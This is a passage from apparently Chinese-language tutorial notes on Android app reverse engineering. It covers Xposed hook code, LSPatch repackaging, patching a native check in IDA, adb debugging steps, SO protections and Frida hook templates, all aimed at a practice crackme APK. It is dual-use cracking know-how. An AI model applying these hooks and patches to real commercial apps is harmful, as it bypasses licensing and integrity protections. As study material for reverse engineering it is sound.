<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.zj.wuaipojie.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;innerFunc&quot;</span>,String.class,  <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">        param.args[<span class="number">0</span>] = <span class="string">&quot;111111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="反射调用"   >
          <a href="#反射调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h4>
      <p>即先hook住某个函数，然后找到类之后对应调用即可</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = XposedHelpers.findClass(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.zj.wuaipojie.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;innerFunc&quot;</span>,String.class,  <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);  </span><br><span class="line">        <span class="comment">//第一步找到类</span></span><br><span class="line">        <span class="comment">//找到方法，如果是私有方法就要setAccessible设置访问权限</span></span><br><span class="line">        <span class="comment">//invoke主动调用或者set修改值(变量)</span></span><br><span class="line">        Class democlass = Class.forName(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,<span class="keyword">false</span>,loadPackageParam.classLoader);  </span><br><span class="line">        Method demomethod = democlass.getDeclaredMethod(<span class="string">&quot;refl&quot;</span>);  </span><br><span class="line">        demomethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        demomethod.invoke(clazz.newInstance());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="遍历包中所有类下所有方法"   >
          <a href="#遍历包中所有类下所有方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#遍历包中所有类下所有方法" class="headerlink" title="遍历包中所有类下所有方法"></a>遍历包中所有类下所有方法</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);  </span><br><span class="line">        Class clazz = (Class) param.getResult();  </span><br><span class="line">        String clazzName = clazz.getName();  </span><br><span class="line">        <span class="comment">//排除非包名的类  </span></span><br><span class="line">        <span class="keyword">if</span>(clazzName.contains(<span class="string">&quot;com.zj.wuaipojie&quot;</span>))&#123;  </span><br><span class="line">            Method[] mds = clazz.getDeclaredMethods();  </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;mds.length;i++)&#123;  </span><br><span class="line">                <span class="keyword">final</span> Method md = mds[i];  </span><br><span class="line">                <span class="keyword">int</span> mod = mds[i].getModifiers();  </span><br><span class="line">                <span class="comment">//去除抽象、native、接口方法  </span></span><br><span class="line">                <span class="keyword">if</span>(!Modifier.isAbstract(mod)  </span><br><span class="line">                    &amp;&amp; !Modifier.isNative(mod)  </span><br><span class="line">                    &amp;&amp;!Modifier.isAbstract(mod))&#123;  </span><br><span class="line">                    XposedBridge.hookMethod(mds[i], <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">                        <span class="meta">@Override</span>  </span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">                            <span class="keyword">super</span>.beforeHookedMethod(param);  </span><br><span class="line">                            Log.d(<span class="string">&quot;zj2595&quot;</span>,md.toString());  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;);  </span><br><span class="line">                &#125;  </span><br><span class="line"></span><br><span class="line">           &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="堆栈查询"   >
          <a href="#堆栈查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆栈查询" class="headerlink" title="堆栈查询"></a>堆栈查询</h4>
      <p>定位”已过期”字符串赋值部分的堆栈</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;android.widget.TextView&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;setText&quot;</span>, CharSequence.class, <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>.beforeHookedMethod(param);  </span><br><span class="line">        Log.d(<span class="string">&quot;zj2595&quot;</span>,param.args[<span class="number">0</span>].toString());  </span><br><span class="line">                <span class="keyword">if</span>(param.args[<span class="number">0</span>].equals(<span class="string">&quot;已过期&quot;</span>))&#123;  </span><br><span class="line">                    printStackTrace();  </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printStackTrace</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    Throwable ex = <span class="keyword">new</span> Throwable();  </span><br><span class="line">    StackTraceElement[] stackElements = ex.getStackTrace();  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stackElements.length; i++) &#123;  </span><br><span class="line">        StackTraceElement element = stackElements[i];  </span><br><span class="line">        Log.d(<span class="string">&quot;zj2595&quot;</span>,<span class="string">&quot;at &quot;</span> + element.getClassName() + <span class="string">&quot;.&quot;</span> + element.getMethodName() + <span class="string">&quot;(&quot;</span> + element.getFileName() + <span class="string">&quot;:&quot;</span> + element.getLineNumber() + <span class="string">&quot;)&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="事件监听"   >
          <a href="#事件监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h4>
      <p>检测点击事件对应的方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = XposedHelpers.findClass(<span class="string">&quot;android.view.View&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">XposedBridge.hookAllMethods(clazz, <span class="string">&quot;performClick&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);  </span><br><span class="line">        Object listenerInfoObject = XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mListenerInfo&quot;</span>);  </span><br><span class="line">        Object mOnClickListenerObject = XposedHelpers.getObjectField(listenerInfoObject, <span class="string">&quot;mOnClickListener&quot;</span>);  </span><br><span class="line">        String callbackType = mOnClickListenerObject.getClass().getName();  </span><br><span class="line">        Log.d(<span class="string">&quot;zj2595&quot;</span>,callbackType);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h4 id="布局改写"   >
          <a href="#布局改写" class="heading-link"><i class="fas fa-link"></i></a><a href="#布局改写" class="headerlink" title="布局改写"></a>布局改写</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSixth&quot;</span>, loadPackageParam.classLoader,  </span><br><span class="line">        <span class="string">&quot;onCreate&quot;</span>, Bundle.class, <span class="keyword">new</span> XC_MethodHook() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);  </span><br><span class="line">        View img = (View)XposedHelpers.callMethod(param.thisObject,  </span><br><span class="line">                <span class="string">&quot;findViewById&quot;</span>, <span class="number">0x7f0800de</span>);  </span><br><span class="line">        img.setVisibility(View.GONE);  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>


        <h3 id="LSPosed免root"   >
          <a href="#LSPosed免root" class="heading-link"><i class="fas fa-link"></i></a><a href="#LSPosed免root" class="headerlink" title="LSPosed免root"></a>LSPosed免root</h3>
      <p>使用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPatch%E5%8D%B3%E5%8F%AF" >https://github.com/LSPosed/LSPatch即可</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>先安装模块，然后打开LPatch，在应用栏添加应用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116105811518.png" alt="image-20240116105811518"></p>
<p>选择已安装的APK，或者存储目录都行</p>
<ul>
<li><p>本地模式：只能在本地设备运行，相当于还是hook</p>
</li>
<li><p>集成模式：将模块嵌入到APP中，可以在其他手机运行，这个其实也会修改签名</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116110011670.png" alt="image-20240116110011670"></p>
<p>点击嵌入模块，然后选择对应的模块即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116110036790.png" alt="image-20240116110036790"></p>
<p>覆写版本号，选择签名强度开始修补即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240116110105910.png" alt="image-20240116110105910"></p>
<p>修补后会在之前选定的存储目录中生成对应的APP，此时安装即可。</p>
</li>
</ul>

        <h3 id="简单HOOK"   >
          <a href="#简单HOOK" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单HOOK" class="headerlink" title="简单HOOK"></a>简单HOOK</h3>
      <p>有一些简单hook的教程，还有Xposed的源码解析</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/littleWhiteDuck/SimpleHook" >GitHub - littleWhiteDuck/SimpleHook: SimpleHook hook部分代码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="十、不是我说，有了IDA还要什么女朋友？"   >
          <a href="#十、不是我说，有了IDA还要什么女朋友？" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、不是我说，有了IDA还要什么女朋友？" class="headerlink" title="十、不是我说，有了IDA还要什么女朋友？"></a>十、不是我说，有了IDA还要什么女朋友？</h2>
      <p>ELF就不介绍了</p>

        <h3 id="NDK开发"   >
          <a href="#NDK开发" class="heading-link"><i class="fas fa-link"></i></a><a href="#NDK开发" class="headerlink" title="NDK开发"></a>NDK开发</h3>
      <p>在Frida逆向与抓包实战有介绍</p>

        <h3 id="课后作业-4"   >
          <a href="#课后作业-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#课后作业-4" class="headerlink" title="课后作业"></a>课后作业</h3>
      <p>如之前所分析的，调用的是so里面的getSercet函数，打开IDA分析，修改函数如下返回值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126102319382.png" alt="image-20240126102319382"></p>
<p>修改为MOV W0,1即可，再用MT导入apk包重新安装即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240126102505349.png" alt="image-20240126102505349"></p>

        <h2 id="十二、大佬帮我分析一下"   >
          <a href="#十二、大佬帮我分析一下" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、大佬帮我分析一下" class="headerlink" title="十二、大佬帮我分析一下"></a>十二、大佬帮我分析一下</h2>
      
        <h3 id="so文件加载流程"   >
          <a href="#so文件加载流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#so文件加载流程" class="headerlink" title="so文件加载流程"></a>so文件加载流程</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/bb663034587188a1fa4ebf55789f66542707.png" alt="img"></p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">函数名</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>android_dlopen_ext()</code> 、<code>dlopen()</code>、<code>do_dlopen()</code></td>
<td align="left">这三个函数主要用于加载库文件。<code>android_dlopen_ext</code> 是系统的一个函数，用于在运行时动态加载共享库。与标准的 <code>dlopen()</code> 函数相比，<code>android_dlopen_ext</code> 提供了更多的参数选项和扩展功能，例如支持命名空间、符号版本等特性。</td>
</tr>
<tr>
<td align="left"><code>find_library()</code></td>
<td align="left"><code>find_library()</code> 函数用于查找库，基本的用途是给定一个库的名字，然后查找并返回这个库的路径。</td>
</tr>
<tr>
<td align="left"><code>call_constructors()</code></td>
<td align="left"><code>call_constructors()</code> 是用于调用动态加载库中的构造函数的函数。</td>
</tr>
<tr>
<td align="left"><code>init</code></td>
<td align="left">库的构造函数，用于初始化库中的静态变量或执行其他需要在库被加载时完成的任务。如果没有定义<code>init</code>函数，系统将不会执行任何动作。需要注意的是，<code>init</code>函数不应该有任何参数，并且也没有返回值。</td>
</tr>
<tr>
<td align="left"><code>init_array</code></td>
<td align="left"><code>init_array</code>是ELF（Executable and Linkable Format，可执行和可链接格式）二进制格式中的一个特殊段（section），这个段包含了一些函数的指针，这些函数将在<code>main()</code>函数执行前被调用，用于初始化静态局部变量和全局变量。</td>
</tr>
<tr>
<td align="left"><code>jni_onload</code></td>
<td align="left">这是Android JNI(Java Native Interface)中的一个函数。当一个native库被系统加载时，该函数会被自动调用。<code>JNI_OnLoad</code>可以做一些初始化工作，例如注册你的native方法或者初始化一些数据结构。如果你的native库没有定义这个函数，那么JNI会使用默认的行为。<code>JNI_OnLoad</code>的返回值应该是需要的JNI版本，一般返回<code>JNI_VERSION_1_6</code>。</td>
</tr>
</tbody></table></div>

        <h3 id="下断点时机"   >
          <a href="#下断点时机" class="heading-link"><i class="fas fa-link"></i></a><a href="#下断点时机" class="headerlink" title="下断点时机"></a>下断点时机</h3>
      <p>应用级别的：java_com_XXX；<br>外壳级别的：JNI_Onload，.init，.init_array(反调试);<br>系统级别的：fopen，fget，dvmdexfileopen(脱壳)；</p>

        <h3 id="调试步骤"   >
          <a href="#调试步骤" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试步骤" class="headerlink" title="调试步骤"></a>调试步骤</h3>
      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.ChallengeEight （去掉-D 则表示不以debug模式启动app）</span><br><span class="line">adb forward tcp:23946 tcp:23946 (端口转发)</span><br><span class="line">adb forward tcp:8700 jdwp:PID (pid监听)</span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 (jdb挂起)</span><br></pre></td></tr></table></div></figure>

<p>PS：若不是以debug启动则不需要输入后两条命令</p>
<p>有时候so文件是在apk点击登录或者什么操作之后才会加载调用，这时候就不需要<code>adb shell am start</code>进行启动，在手机启动apk然后开启端口转发，附加就行，比较不容易出错。</p>

        <h3 id="SO防护手段"   >
          <a href="#SO防护手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#SO防护手段" class="headerlink" title="SO防护手段"></a>SO防护手段</h3>
      <p>常见防护手段:</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">主要功能</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SO加壳</td>
<td align="left">对C/C++源码编译出来的SO文件进行加壳，使SO文件无法正确反编译和反汇编。</td>
</tr>
<tr>
<td align="left">SO源码虚拟化保护</td>
<td align="left">将原始汇编指令翻译为自定义的虚拟机指令，跳转到自定义的虚拟机中执行，每次保护生成的虚拟机指令随机，且对虚拟机解释器再度混淆</td>
</tr>
<tr>
<td align="left">SO防调用</td>
<td align="left">对SO文件进行授权绑定，防止SO文件被非授权应用调用运行。</td>
</tr>
<tr>
<td align="left">SO Linker</td>
<td align="left">对整个SO文件进行加密压缩，包括代码段、符号表和字符串等，运行时再解密解压缩到内存，从而有效的防止SO数据的泄露。</td>
</tr>
<tr>
<td align="left">SO源码混淆</td>
<td align="left">常量字符串加密、分裂基本块、等价指令替换、虚假控制流、控制流平坦化。</td>
</tr>
<tr>
<td align="left">SO环境监测</td>
<td align="left">防frida\xposed\root、防动态调试、防模拟器、防多开等</td>
</tr>
</tbody></table></div>
<p>OLLVM具体分析相关部分放在IDA逆向技巧了，包括交叉引用、Trace等等</p>

        <h2 id="十三、是时候学习一下Frida一把梭了-上"   >
          <a href="#十三、是时候学习一下Frida一把梭了-上" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、是时候学习一下Frida一把梭了-上" class="headerlink" title="十三、是时候学习一下Frida一把梭了(上)"></a>十三、是时候学习一下Frida一把梭了(上)</h2>
      
        <h3 id="Frida原理"   >
          <a href="#Frida原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#Frida原理" class="headerlink" title="Frida原理"></a>Frida原理</h3>
      <p>frida注入的原理就是找到目标进程,使用ptrace跟踪目标进程获取mmap，dlpoen，dlsym等函数库的偏移获取mmap在目标进程申请一段内存空间将在目标进程中找到存放frida-agent-32/64.so的空间启动执行各种操作由agent去实现</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">组件名称</th>
<th align="left">功能描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">frida-gum</td>
<td align="left">提供了inline-hook的核心实现，还包含了代码跟踪模块Stalker，用于内存访问监控的MemoryAccessMonitor，以及符号查找、栈回溯实现、内存扫描、动态代码生成和重定位等功能</td>
</tr>
<tr>
<td align="left">frida-core</td>
<td align="left">fridahook的核心，具有进程注入、进程间通信、会话管理、脚本生命周期管理等功能，屏蔽部分底层的实现细节并给最终用户提供开箱即用的操作接口。包含了frida-server、frida-gadget、frida-agent、frida-helper、frida-inject等关键模块和组件，以及之间的互相通信底座</td>
</tr>
<tr>
<td align="left">frida-gadget</td>
<td align="left">本身是一个动态库，可以通过重打包修改动态库的依赖或者修改smali代码去实现向三方应用注入gadget，从而实现Frida的持久化或免root</td>
</tr>
<tr>
<td align="left">frida-server</td>
<td align="left">本质上是一个二进制文件，类似于前面学习到的android_server，需要在目标设备上运行并转发端口，在Frida hook中起到关键作用</td>
</tr>
</tbody></table></div>
<p>环境配置参考《Frida逆向与抓包实战》</p>

        <h3 id="操作模式"   >
          <a href="#操作模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3>
      <p>即CLI命令行和RPC使用js代码注入两种模式</p>

        <h3 id="注入模式"   >
          <a href="#注入模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#注入模式" class="headerlink" title="注入模式"></a>注入模式</h3>
      <p>spawn主动启动模式和attach附加模式</p>

        <h3 id="基础语法"   >
          <a href="#基础语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">API名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Java.use(className)</code></td>
<td align="left">获取指定的Java类并使其在JavaScript代码中可用。</td>
</tr>
<tr>
<td align="left"><code>Java.perform(callback)</code></td>
<td align="left">确保回调函数在Java的主线程上执行。</td>
</tr>
<tr>
<td align="left"><code>Java.choose(className, callbacks)</code></td>
<td align="left">枚举指定类的所有实例。</td>
</tr>
<tr>
<td align="left"><code>Java.cast(obj, cls)</code></td>
<td align="left">将一个Java对象转换成另一个Java类的实例。</td>
</tr>
<tr>
<td align="left"><code>Java.enumerateLoadedClasses(callbacks)</code></td>
<td align="left">枚举进程中已经加载的所有Java类。</td>
</tr>
<tr>
<td align="left"><code>Java.enumerateClassLoaders(callbacks)</code></td>
<td align="left">枚举进程中存在的所有Java类加载器。</td>
</tr>
<tr>
<td align="left"><code>Java.enumerateMethods(targetClassMethod)</code></td>
<td align="left">枚举指定类的所有方法。</td>
</tr>
</tbody></table></div>

        <h3 id="日志输出语法"   >
          <a href="#日志输出语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#日志输出语法" class="headerlink" title="日志输出语法"></a>日志输出语法</h3>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">日志方法</th>
<th align="left">描述</th>
<th align="left">区别</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>console.log()</code></td>
<td align="left">使用JavaScript直接进行日志打印</td>
<td align="left">多用于在CLI模式中，<code>console.log()</code>直接输出到命令行界面，使用户可以实时查看。在RPC模式中，<code>console.log()</code>同样输出在命令行，但可能被Python脚本的输出内容掩盖。</td>
</tr>
<tr>
<td align="left"><code>send()</code></td>
<td align="left">Frida的专有方法，用于发送数据或日志到外部Python脚本</td>
<td align="left">多用于RPC模式中，它允许JavaScript脚本发送数据到Python脚本，Python脚本可以进一步处理或记录这些数据。</td>
</tr>
</tbody></table></div>

        <h3 id="Hook代码"   >
          <a href="#Hook代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hook代码" class="headerlink" title="Hook代码"></a>Hook代码</h3>
      <p>通过<code>logcat |grep &quot;D.zj2595&quot;</code>日志捕获</p>

        <h4 id="框架模板"   >
          <a href="#框架模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#框架模板" class="headerlink" title="框架模板"></a>框架模板</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        hookTest1();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></div></figure>


        <h4 id="hook类普通方法"   >
          <a href="#hook类普通方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook类普通方法" class="headerlink" title="hook类普通方法"></a>hook类普通方法</h4>
      <p>如下即重新实现com.zj.wuaipojie.Demo.a函数，打印参数和返回值</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个名为hookTest1的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span></span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span></span><br><span class="line">    utils.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> retval = <span class="built_in">this</span>.a(str);</span><br><span class="line">        <span class="comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="built_in">console</span>.log(str,retval);</span><br><span class="line">        <span class="comment">//返回&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在这里面修改参数，return返回值就可以修改这个函数了。</p>

        <h4 id="hook重载函数"   >
          <a href="#hook重载函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#hook重载函数" class="headerlink" title="hook重载函数"></a>hook重载函数</h4>
      <p>如果方法是重载的，那么需要设置一下具体的参数，比如上面的函数a是重载的，那么需要设定如下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span></span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span></span><br><span class="line">    utils.a.overload(<span class="string">&quot;java.lang.String&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> retval = <span class="built_in">this</span>.a(str);</span><br><span class="line">        <span class="built_in">console</span>.log(str,retval);</span><br><span class="line">        <span class="comment">//返回&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即添加overload指定对应重载函数的参数来确定该函数</p>

        <h4 id="hook重载自定义参数类型的函数"   >
